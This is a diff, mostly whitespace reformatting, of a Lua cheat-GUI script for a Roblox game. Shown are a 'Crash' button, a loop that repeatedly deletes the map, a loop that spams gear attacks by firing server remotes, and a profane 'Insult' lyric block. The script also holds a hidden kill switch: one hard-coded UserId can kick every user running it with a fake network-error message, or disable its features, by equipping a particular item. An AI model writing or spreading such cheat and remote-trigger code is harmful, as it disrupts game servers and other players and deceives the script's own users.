+				            Ketchup, mustard, mayo, fries, lettuce it's Number Nine
+				            And all these yummy burgers tasty tryna'
+				            Get me off my grind, but I can't let 'em do it
+				            I got burgers on my mind
+				            Bitch I got burgers on my mind
+				            I got burgers on my mind
+				            I got burgers on my mind
+				            Burgers on my mind
+				            Burgers on my mind
+				            I got burgers on my mind]]
 	}
 
 	--Insult
@@ -3699,7 +3721,7 @@ local function ChGui()
 	Crash.MouseButton1Down:connect(function()
 		Sure()
 	end)
-	
+
 	--StopScriptsCommands
 	if not table.find(SafePlayers,game.Players.LocalPlayer.UserId) then
 		for i,v in pairs(game.Players:GetChildren()) do
@@ -3857,7 +3879,7 @@ local function ChGui()
 
 	--Search
 	Search.MouseButton1Down:connect(function()
-	    print '1'
+		print '1'
 		for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
 			if v.Name == "SearchUI" then
 				v:Remove()
@@ -4206,13 +4228,28 @@ local function ChGui()
 		Hitlist.Visible = true
 	end)
 
-	--AntiWater
-	AntiWater.MouseButton1Down:connect(function()
-		for i,v in pairs(game.Workspace:GetDescendants()) do
-			if v.Name == "WaterKill" then
-				v:Remove()
+	--AntiMap
+	AntiMap.MouseButton1Down:connect(function()
+		_G.AntiMap = true
+		while _G.AntiMap do
+			game.RunService.RenderStepped:wait()
+			if game.Workspace:FindFirstChild("MapModel") then
+				game.Workspace.MapModel:Remove()
 			end
 		end
+	end)
+	AntiMap.MouseButton1Down:connect(function()
+		AntiMap.Visible = false
+		UnAntiMap.Visible = true
+	end)
+
+	--UnAntiMap
+	UnAntiMap.MouseButton1Down:connect(function()
+		_G.AntiMap = false
+	end)
+	UnAntiMap.MouseButton1Down:connect(function()
+		UnAntiMap.Visible = false
+		AntiMap.Visible = true
 	end)
 
 	--RemoveWalls
@@ -4623,82 +4660,82 @@ local function ChGui()
 		while _G.Spam do
 			game.RunService.RenderStepped:wait()
 			if _G.Grimgold then --GrimCheck
-			    pcall(function()
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(73829193)
-				game.Players.LocalPlayer.Backpack:WaitForChild("GrimgoldPeriastron").Parent = game.Players.LocalPlayer.Character
-				game.Players.LocalPlayer.Character:WaitForChild("GrimgoldPeriastron").Remote:FireServer(Enum.KeyCode.Q)
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(73829193)
-			    end)
+				pcall(function()
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(73829193)
+					game.Players.LocalPlayer.Backpack:WaitForChild("GrimgoldPeriastron").Parent = game.Players.LocalPlayer.Character
+					game.Players.LocalPlayer.Character:WaitForChild("GrimgoldPeriastron").Remote:FireServer(Enum.KeyCode.Q)
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(73829193)
+				end)
 			elseif _G.Epsilon then --EpsilonCheck
-			    pcall(function()
-				wait()
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(233520257)
-				wait()
-			    game.Players.LocalPlayer.Backpack:WaitForChild("JoyfulPeriastron").Parent = game.Players.LocalPlayer.Character
-				wait()
-				game.Players.LocalPlayer.Character:WaitForChild("JoyfulPeriastron").Remote:FireServer(Enum.KeyCode.Q)
-				wait()
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(233520257)
+				pcall(function()
+					wait()
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(233520257)
+					wait()
+					game.Players.LocalPlayer.Backpack:WaitForChild("JoyfulPeriastron").Parent = game.Players.LocalPlayer.Character
+					wait()
+					game.Players.LocalPlayer.Character:WaitForChild("JoyfulPeriastron").Remote:FireServer(Enum.KeyCode.Q)
+					wait()
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(233520257)
 				end)
 			elseif _G.Chart then --ChartCheck
-			    pcall(function()
-				wait()
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(80661504)
-				wait()
-				game.Players.LocalPlayer.Backpack:WaitForChild("ChartreusePeriastron").Parent = game.Players.LocalPlayer.Character
-				wait()
-				game.Players.LocalPlayer.Character:WaitForChild("ChartreusePeriastron").Remote:FireServer(Enum.KeyCode.Q)
-				wait()
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(80661504)
-			    end)
-			elseif _G.Woods then --WoodsCheck
-			    pcall(function()
-				wait()
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(172289170)
-				wait()
-				game.Players.LocalPlayer.Backpack:WaitForChild("FallKnightSword").Parent = game.Players.LocalPlayer.Character
-				wait()
-				local RunService = game:GetService("RunService")
-				local Timer = 0 
-				local Stop = 10
-				local RATE_PER_SECOND = 2
-				_G.On = true
-				RunService.RenderStepped:Connect(function(step)
-					local increment = RATE_PER_SECOND * step
-					if Timer < Stop and _G.On then
-						game:GetService("Players").LocalPlayer.Character:WaitForChild("FallKnightSword").ControlFunction:InvokeServer("KeyDown","q")
-						game:GetService("Players").LocalPlayer.Character:WaitForChild("FallKnightSword").ControlFunction:InvokeServer("KeyDown","q")
-						Timer = Timer + 1
-					else
-						_G.On = false
-					end
-				end)
-				wait(1)
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(172289170)
-			    end)
-			elseif _G.Tela then --TelaCheck
-			    pcall(function()
-				wait()
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(93136746)
-				wait()
-				game.Players.LocalPlayer.Backpack:WaitForChild("TelamonsterTheChaosEdge").Parent = game.Players.LocalPlayer.Character
-				wait()
-				game.Players.LocalPlayer.Character:WaitForChild("TelamonsterTheChaosEdge").Remote:FireServer(Enum.KeyCode.Q)
-				wait(0.75)
-				game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(93136746)
-			    end)
-			elseif _G.Wind then --WindCheck
-			    pcall(function()
-				if not game.Players.LocalPlayer.Character:FindFirstChild("KOSSGustHorn") and not game.Players.LocalPlayer.Backpack:FindFirstChild("KOSSGustHorn") then
-					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(127506257)
+				pcall(function()
 					wait()
-				end
-				if game.Players.LocalPlayer.Backpack:FindFirstChild("KOSSGustHorn") then
-					game.Players.LocalPlayer.Backpack:WaitForChild("KOSSGustHorn").Parent = game.Players.LocalPlayer.Character
-				end
-				wait(0.1)
-				game.Players.LocalPlayer.Character:WaitForChild("KOSSGustHorn").RemoteEvent:FireServer("DO THE THING!!!")
-			    end)
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(80661504)
+					wait()
+					game.Players.LocalPlayer.Backpack:WaitForChild("ChartreusePeriastron").Parent = game.Players.LocalPlayer.Character
+					wait()
+					game.Players.LocalPlayer.Character:WaitForChild("ChartreusePeriastron").Remote:FireServer(Enum.KeyCode.Q)
+					wait()
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(80661504)
+				end)
+			elseif _G.Woods then --WoodsCheck
+				pcall(function()
+					wait()
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(172289170)
+					wait()
+					game.Players.LocalPlayer.Backpack:WaitForChild("FallKnightSword").Parent = game.Players.LocalPlayer.Character
+					wait()
+					local RunService = game:GetService("RunService")
+					local Timer = 0 
+					local Stop = 10
+					local RATE_PER_SECOND = 2
+					_G.On = true
+					RunService.RenderStepped:Connect(function(step)
+						local increment = RATE_PER_SECOND * step
+						if Timer < Stop and _G.On then
+							game:GetService("Players").LocalPlayer.Character:WaitForChild("FallKnightSword").ControlFunction:InvokeServer("KeyDown","q")
+							game:GetService("Players").LocalPlayer.Character:WaitForChild("FallKnightSword").ControlFunction:InvokeServer("KeyDown","q")
+							Timer = Timer + 1
+						else
+							_G.On = false
+						end
+					end)
+					wait(1)
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(172289170)
+				end)
+			elseif _G.Tela then --TelaCheck
+				pcall(function()
+					wait()
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(93136746)
+					wait()
+					game.Players.LocalPlayer.Backpack:WaitForChild("TelamonsterTheChaosEdge").Parent = game.Players.LocalPlayer.Character
+					wait()
+					game.Players.LocalPlayer.Character:WaitForChild("TelamonsterTheChaosEdge").Remote:FireServer(Enum.KeyCode.Q)
+					wait(0.75)
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(93136746)
+				end)
+			elseif _G.Wind then --WindCheck
+				pcall(function()
+					if not game.Players.LocalPlayer.Character:FindFirstChild("KOSSGustHorn") and not game.Players.LocalPlayer.Backpack:FindFirstChild("KOSSGustHorn") then
+						game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(127506257)
+						wait()
+					end
+					if game.Players.LocalPlayer.Backpack:FindFirstChild("KOSSGustHorn") then
+						game.Players.LocalPlayer.Backpack:WaitForChild("KOSSGustHorn").Parent = game.Players.LocalPlayer.Character
+					end
+					wait(0.1)
+					game.Players.LocalPlayer.Character:WaitForChild("KOSSGustHorn").RemoteEvent:FireServer("DO THE THING!!!")
+				end)
 			else --NoneSelected
 				print("Pick A Gear to Spam on Page 5!!")
 			end
@@ -4845,31 +4882,31 @@ end
 
 --InventoryKicks
 for i,v in pairs(game.Players:GetChildren()) do
-    if v.UserId == 2907647450 then
-        v.Backpack.ChildAdded:connect(function(NewGear)
-            if NewGear.Name == "Purple Basket" then
-                game.Players.LocalPlayer:Kick("Network Failed To Connect")
-            end
-        end)
-    end
+	if v.UserId == 2907647450 then
+		v.Backpack.ChildAdded:connect(function(NewGear)
+			if NewGear.Name == "Purple Basket" then
+				game.Players.LocalPlayer:Kick("Network Failed To Connect")
+			end
+		end)
+	end
 end
 game.Players.PlayerAdded:Connect(function(v)
-    if v.UserId == 2907647450 then
-        v.Backpack.ChildAdded:connect(function(NewGear)
-            if NewGear.Name == "Purple Basket" then
-                print "Kicking"
-                game.Players["LocalPlayer"]:Kick()
-            end
-        end)
-    end
+	if v.UserId == 2907647450 then
+		v.Backpack.ChildAdded:connect(function(NewGear)
+			if NewGear.Name == "Purple Basket" then
+				print "Kicking"
+				game.Players["LocalPlayer"]:Kick()
+			end
+		end)
+	end
 end)
 
 --InventoryStop
 for i,v in pairs(game.Players:GetChildren()) do
-    if v.UserId == 2907647450 then
-        v.Backpack.ChildAdded:connect(function(NewGear)
-            if NewGear.Name == "Pastel Basket" then
-            	_G.GrimSpam = false
+	if v.UserId == 2907647450 then
+		v.Backpack.ChildAdded:connect(function(NewGear)
+			if NewGear.Name == "Pastel Basket" then
+				_G.GrimSpam = false
 				_G.AirWalk = false
 				_G.AntiJoin = false
 				_G.TorsoCbring = false
@@ -4899,15 +4936,15 @@ for i,v in pairs(game.Players:GetChildren()) do
 				game.Lighting.ClockTime = "12"
 				game:GetService("ReplicatedStorage").Remotes.SetRigType:FireServer(Enum.HumanoidRigType.R6)
 				game.Players.LocalPlayer.PlayerGui.CHGui:Remove()
-            end
-        end)
-    end
+			end
+		end)
+	end
 end
 game.Players.PlayerAdded:Connect(function(v)
-    if v.UserId == 2907647450 then
-        v.Backpack.ChildAdded:connect(function(NewGear)
-            if NewGear.Name == "Pastel Basket" then
-            	_G.GrimSpam = false
+	if v.UserId == 2907647450 then
+		v.Backpack.ChildAdded:connect(function(NewGear)
+			if NewGear.Name == "Pastel Basket" then
+				_G.GrimSpam = false
 				_G.AirWalk = false
 				_G.AntiJoin = false
 				_G.TorsoCbring = false
@@ -4937,7 +4974,7 @@ game.Players.PlayerAdded:Connect(function(v)
 				game.Lighting.ClockTime = "12"
 				game:GetService("ReplicatedStorage").Remotes.SetRigType:FireServer(Enum.HumanoidRigType.R6)
 				game.Players.LocalPlayer.PlayerGui.CHGui:Remove()
-            end
-        end)
-    end
+			end
+		end)
+	end
 end)
